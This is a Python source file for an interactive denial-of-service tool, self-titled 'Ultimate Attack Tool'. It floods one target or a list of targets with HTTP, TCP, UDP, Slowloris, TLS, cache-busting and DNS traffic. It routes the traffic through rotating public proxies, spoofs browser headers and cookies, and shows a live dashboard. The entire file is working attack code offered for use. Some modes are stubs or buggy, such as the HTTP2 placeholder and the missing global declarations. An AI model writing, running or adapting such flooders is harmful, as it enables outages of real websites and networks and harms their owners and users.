import time, socket, threading, random, asyncio, os, ssl, statistics
import requests, psutil
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from urllib.parse import urlencode
import aiohttp
from collections import deque, Counter
from fake_useragent import UserAgent
import dns.resolver

console = Console()

# =========================
# Global Vars
# =========================
packet_count = 0
packet_success = 0
packet_failed = 0
last_status_code = "-"
last_fail_reason = "-"
avg_latency = 0.0
latency_history = deque(maxlen=50)
start_time = time.time()
pps_history = deque(maxlen=50)
PROXIES = []
proxy_lock = threading.Lock()
TARGET_PORT = None
AUTO_PORTS = [80, 443, 8080, 8443, 8000, 8888]
mode_names = [
    "HTTP Flood", "TCP SYN", "UDP Flood", "Slowloris",
    "Hybrid (HTTP+UDP)", "TLS Flood", "HTTP2 Rapid Reset",
    "Cache-Busting HTTP Flood", "DNS Flood", "Mixed Layer Attack"
]
history_window = deque(maxlen=1000)
fail_reasons = Counter()
targets_list = []
targets_ip_map = {}
cookies_store = {}
RAINBOW_COLORS = ["red", "magenta", "blue", "cyan", "green", "yellow"]

ua_gen = UserAgent()
proxy_fallback_notified = False
PROXY_API_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt"

# =========================
# Proxy Handling
# =========================
def fetch_proxies():
    global proxy_fallback_notified
    proxies = []
    try:
        resp = requests.get(PROXY_API_URL, timeout=8)
        proxies = resp.text.strip().split("\n")
    except Exception as e:
        console.print(f"[red]Proxy API error: {e}[/]")
    proxies = list(set([p.strip() for p in proxies if p.strip()]))
    working = test_proxies(proxies)
    if working:
        with open("proxy.txt", "w") as f:
            f.write("\n".join(working))
        return working
    elif os.path.exists("proxy.txt"):
        if not proxy_fallback_notified:
            console.print("[yellow]⚠ API proxies failed, loading from proxy.txt...[/]")
            proxy_fallback_notified = True
        with open("proxy.txt", "r") as f:
            file_proxies = [line.strip() for line in f if line.strip()]
        return test_proxies(file_proxies)
    console.print("[yellow]⚠ No proxies found, running without proxy...[/]")
    return []

def load_proxies_from_file():
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            file_proxies = [line.strip() for line in f if line.strip()]
        return test_proxies(file_proxies)
    else:
        console.print("[red]proxy.txt not found![/]")
        return []

def test_proxies(proxy_list):
    working = []
    for p in proxy_list[:50]:
        try:
            resp = requests.get("http://httpbin.org/ip",
                                 proxies={"http": f"http://{p}", "https": f"http://{p}"},
                                 timeout=3)
            if resp.status_code == 200:
                working.append(p)
        except:
            pass
    return working

def auto_proxy_updater(interval=60):
    global PROXIES
    while True:
        new_proxies = fetch_proxies()
        if new_proxies:
            with proxy_lock:
                PROXIES = new_proxies
            console.print(f"[green]Proxy list updated ({len(new_proxies)} working proxies)[/]")
        time.sleep(interval)

def proxy_health():
    if not PROXIES:
        return "No proxies"
    total = len(PROXIES)
    return f"{total} proxies active"

# =========================
# TLS Context
# =========================
def random_ssl_context():
    ctx = ssl.create_default_context()
    ctx.set_ciphers("ALL:@SECLEVEL=1")
    ctx.options |= ssl.OP_NO_TICKET
    return ctx

# =========================
# Cookie Grabber
# =========================
def grab_cookies(target):
    try:
        resp = requests.get(f"http://{target}:{get_port()}",
                            headers={"User-Agent": ua_gen.random},
                            timeout=3)
        cookies_store[target] = resp.cookies.get_dict()
        console.print(f"[cyan]Cookies grabbed for {target}: {cookies_store[target]}[/]")
    except:
        cookies_store[target] = {}

# =========================
# Helpers
# =========================
def get_port():
    return TARGET_PORT if TARGET_PORT else random.choice(AUTO_PORTS)

def random_payload():
    return urlencode({f"param{random.randint(1,100)}": random.randint(1,99999) for _ in range(random.randint(1,5))})

def random_headers(target):
    headers = {
        "User-Agent": ua_gen.random,
        "Accept": "*/*",
        "Cache-Control": "no-cache",
        "Referer": f"http://{target}/",
        "Connection": "keep-alive"
    }
    if target in cookies_store and cookies_store[target]:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies_store[target].items()])
        headers["Cookie"] = cookie_str
    return headers

def status_message(code):
    mapping = {200:"OK",301:"Moved Permanently",302:"Found",400:"Bad Request",401:"Unauthorized",403:"Forbidden",404:"Not Found",500:"Internal Server Error",502:"Bad Gateway",503:"Service Unavailable"}
    return mapping.get(code, "Unknown")

def record_fail_reason(reason):
    fail_reasons[reason] += 1

# =========================
# Attack Modes
# =========================
async def http_flood(target):
    global packet_count, packet_success, packet_failed, last_status_code, avg_latency, last_fail_reason
    url = f"http://{target}:{get_port()}/?{random_payload()}"
    with proxy_lock:
        proxy = random.choice(PROXIES) if PROXIES else None
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=random_ssl_context())) as session:
            start = time.time()
            async with session.get(url,
                                   headers=random_headers(target),
                                   proxy=f"http://{proxy}" if proxy else None,
                                   timeout=5) as resp:
                latency = time.time() - start
                latency_history.append(latency)
                avg_latency = statistics.mean(latency_history)
                last_status_code = f"{resp.status} {status_message(resp.status)}"
                packet_success += 1
                history_window.append(True)
    except Exception as e:
        reason = str(e).split(":")[0]
        last_fail_reason = reason
        record_fail_reason(reason)
        packet_failed += 1
        history_window.append(False)

def udp_flood(target):
    global packet_failed, packet_success, last_fail_reason
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(random._urandom(1024), (target, get_port()))
        packet_success += 1
        history_window.append(True)
    except Exception as e:
        reason = str(e).split(":")[0]
        last_fail_reason = reason
        record_fail_reason(reason)
        packet_failed += 1
        history_window.append(False)

def tcp_syn_flood(target):
    global packet_failed, packet_success, last_fail_reason
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target, get_port()))
        packet_success += 1
        history_window.append(True)
    except Exception as e:
        reason = str(e).split(":")[0]
        last_fail_reason = reason
        record_fail_reason(reason)
        packet_failed += 1
        history_window.append(False)

def slowloris(target):
    global packet_failed, packet_success, last_fail_reason
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, get_port()))
        s.send(f"GET /?{random_payload()} HTTP/1.1\r\n".encode())
        for _ in range(5):
            s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
            time.sleep(15)
        packet_success += 1
        history_window.append(True)
    except Exception as e:
        reason = str(e).split(":")[0]
        last_fail_reason = reason
        record_fail_reason(reason)
        packet_failed += 1
        history_window.append(False)

# === NEW Modes ===
def tls_flood(target):
    try:
        s = ssl.wrap_socket(socket.socket(socket.AF_INET), ssl_version=ssl.PROTOCOL_TLSv1_2)
        s.connect((target, 443))
        s.close()
        packet_success += 1
    except Exception as e:
        record_fail_reason(str(e).split(":")[0])

def http2_reset(target):
    record_fail_reason("HTTP2 Simulation")  # Placeholder

def cache_busting_flood(target):
    asyncio.run(http_flood(target))

def dns_flood(target):
    try:
        dns.resolver.resolve(target, 'A')
        packet_success += 1
    except Exception as e:
        record_fail_reason(str(e).split(":")[0])

def mixed_attack(target):
    udp_flood(target)
    tcp_syn_flood(target)

# =========================
# Dashboard
# =========================
def rainbow_pps_graph():
    if not pps_history: return ""
    max_pps = max(pps_history) or 1
    bars = []
    color_index = int(time.time() * 5) % len(RAINBOW_COLORS)
    for val in pps_history:
        bar_height = "█" if (val / max_pps) > 0.5 else "▁"
        bars.append(f"[{RAINBOW_COLORS[color_index % len(RAINBOW_COLORS)]}]{bar_height}[/{RAINBOW_COLORS[color_index % len(RAINBOW_COLORS)]}]")
        color_index += 1
    return "".join(bars)

def latency_graph():
    if not latency_history: return ""
    max_lat = max(latency_history) or 1
    graph = ""
    for lat in latency_history:
        height = int((lat / max_lat) * 8)
        graph += "▁▂▃▄▅▆▇█"[height]
    return graph

def dashboard():
    last_packets = 0
    with Live(refresh_per_second=1, console=console) as live:
        while True:
            elapsed = time.time() - start_time
            pps = packet_count - last_packets
            last_packets = packet_count
            pps_history.append(pps)
            fail_rate = (history_window.count(False)/len(history_window)*100 if len(history_window) else 0)
            top_fails = fail_reasons.most_common(5)
            table = Table(title=f"🚀 Attack Dashboard 🚀", style="bold cyan")
            table.add_column("Metric", justify="right")
            table.add_column("Value", justify="left")
            target_display = [f"{t} ({targets_ip_map.get(t, '?')})" for t in targets_list]
            table.add_row("Target(s)", ", ".join(target_display))
            table.add_row("Port Mode", str(TARGET_PORT) if TARGET_PORT else "Auto-Rotate")
            table.add_row("Packets Sent", f"{packet_count:,}")
            table.add_row("Packets/sec", f"{pps}")
            table.add_row("Success", f"[green]{packet_success:,}[/]")
            table.add_row("Failed", f"[red]{packet_failed:,}[/]")
            table.add_row("Fail Rate", f"{fail_rate:.2f}%")
            table.add_row("Last Status Code", str(last_status_code))
            table.add_row("Last Fail Reason", last_fail_reason)
            table.add_row("Top Fail Reasons", ", ".join([f"{r} ({c})" for r,c in top_fails]))
            table.add_row("Avg Latency", f"{avg_latency:.3f} s")
            table.add_row("Latency Graph", latency_graph())
            table.add_row("Proxy Health", proxy_health())
            table.add_row("CPU Usage", f"{psutil.cpu_percent()}%")
            table.add_row("RAM Usage", f"{psutil.virtual_memory().percent}%")
            table.add_row("Uptime", f"{elapsed:.1f} sec")
            table.add_row("PPS Graph", rainbow_pps_graph())
            live.update(Panel(table, border_style="bright_magenta"))

# =========================
# Runner
# =========================
def runner(mode, targets, threads):
    if mode == 1:
        async def run_http():
            global packet_count
            while True:
                target = random.choice(targets)
                await http_flood(target)
                packet_count += 1
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        for _ in range(threads): loop.create_task(run_http())
        loop.run_forever()
    elif mode == 2:
        def run_tcp():
            global packet_count
            while True:
                target = random.choice(targets)
                tcp_syn_flood(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_tcp, daemon=True).start()
    elif mode == 3:
        def run_udp():
            global packet_count
            while True:
                target = random.choice(targets)
                udp_flood(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_udp, daemon=True).start()
    elif mode == 4:
        def run_slow():
            global packet_count
            while True:
                target = random.choice(targets)
                slowloris(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_slow, daemon=True).start()
    elif mode == 5:
        http_threads = threads // 2
        udp_threads = threads - http_threads
        async def run_http():
            global packet_count
            while True:
                target = random.choice(targets)
                await http_flood(target)
                packet_count += 1
        def run_udp():
            global packet_count
            while True:
                target = random.choice(targets)
                udp_flood(target)
                packet_count += 1
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        for _ in range(http_threads): loop.create_task(run_http())
        for _ in range(udp_threads): threading.Thread(target=run_udp, daemon=True).start()
        loop.run_forever()
    elif mode == 6:
        def run_tls():
            global packet_count
            while True:
                target = random.choice(targets)
                tls_flood(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_tls, daemon=True).start()
    elif mode == 7:
        def run_h2():
            global packet_count
            while True:
                target = random.choice(targets)
                http2_reset(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_h2, daemon=True).start()
    elif mode == 8:
        def run_cache():
            global packet_count
            while True:
                target = random.choice(targets)
                cache_busting_flood(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_cache, daemon=True).start()
    elif mode == 9:
        def run_dns():
            global packet_count
            while True:
                target = random.choice(targets)
                dns_flood(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_dns, daemon=True).start()
    elif mode == 10:
        def run_mix():
            global packet_count
            while True:
                target = random.choice(targets)
                mixed_attack(target)
                packet_count += 1
        for _ in range(threads): threading.Thread(target=run_mix, daemon=True).start()

# =========================
# MAIN
# =========================
if __name__ == "__main__":
    console.print("[bold cyan]=== Ultimate Attack Tool ===[/]")
    target_mode = console.input("[yellow]Single target (1) or Multi target (2)? [/]")
    if target_mode == "1":
        target = console.input("[green]Enter target domain (without port): [/]")
        targets_list = [target]
    else:
        file_path = console.input("[green]Enter file path with target list: [/]")
        with open(file_path, "r") as f:
            targets_list = [line.strip() for line in f if line.strip()]

    for t in targets_list:
        try:
            ip_addr = socket.gethostbyname(t)
        except:
            ip_addr = "?"
        targets_ip_map[t] = ip_addr

    port_input = console.input("[yellow]Enter port (leave empty for auto-rotate): [/]")
    TARGET_PORT = int(port_input) if port_input.strip() else None

    proxy_choice = console.input("[yellow]Proxy source? (1 = Fetch from API, 2 = Use proxy.txt): [/]")
    if proxy_choice == "1":
        PROXIES = fetch_proxies()
    else:
        PROXIES = load_proxies_from_file()

    for tgt in targets_list:
        grab_cookies(tgt)

    threads = int(console.input("[yellow]Threads: [/]"))
    mode = int(console.input(f"[yellow]Mode 1-HTTP, 2-TCP SYN, 3-UDP, 4-Slowloris, 5-Hybrid, 6-TLS, 7-HTTP2, 8-CacheBust, 9-DNS, 10-Mixed: [/]"))

    if proxy_choice == "1":
        threading.Thread(target=auto_proxy_updater, daemon=True).start()

    threading.Thread(target=dashboard, daemon=True).start()
    runner(mode, targets_list, threads)

    while True:
        time.sleep(1)
